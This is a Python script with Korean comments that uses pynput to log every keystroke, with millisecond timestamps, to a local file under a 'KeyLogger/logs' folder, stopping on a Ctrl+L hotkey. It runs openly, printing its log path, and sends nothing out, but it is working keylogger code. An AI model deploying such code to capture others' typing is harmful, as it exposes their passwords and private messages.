from pynput import keyboard
from datetime import datetime
import time
import os

# 경로 설정 및 파일 생성
filename = f"keyboard_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
folder_path = "KeyLogger/logs"
full_path = os.path.join(folder_path, filename)

os.makedirs(folder_path, exist_ok=True)

# 로그 기록 함수
def write_log(key_name):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3] # 밀리초까지 기록
    with open(full_path, "a", encoding="utf-8") as f:
        f.write(f"[{timestamp}] {key_name}\n")

# 키 입력 처리 (단축키 외 일반 기록용)
def on_press(key):
    try:
        k = key.char if hasattr(key, 'char') else str(key)
    except Exception:
        k = str(key)
    
    write_log(k)

# 종료 함수
def on_activate_exit():
    print("\n[알림] 종료 단축키가 감지되었습니다. 기록을 중단합니다.")
    listener.stop()

# 종료 단축키 설정 (Ctrl + l키)
exit_hotkey = keyboard.HotKey(
    keyboard.HotKey.parse('<ctrl>+l'),
    on_activate_exit
)

# 리스너 통합 관리
def monitored_on_press(key):
    exit_hotkey.press(listener.canonical(key))
    on_press(key)

def monitored_on_release(key):
    exit_hotkey.release(listener.canonical(key))


print(f"기록 시작: {full_path}")
print("종료 단축키: Ctrl + l")

# 리스너 실행 (백그라운드 동작)
with keyboard.Listener(on_press=monitored_on_press, on_release=monitored_on_release) as listener:
    listener.join()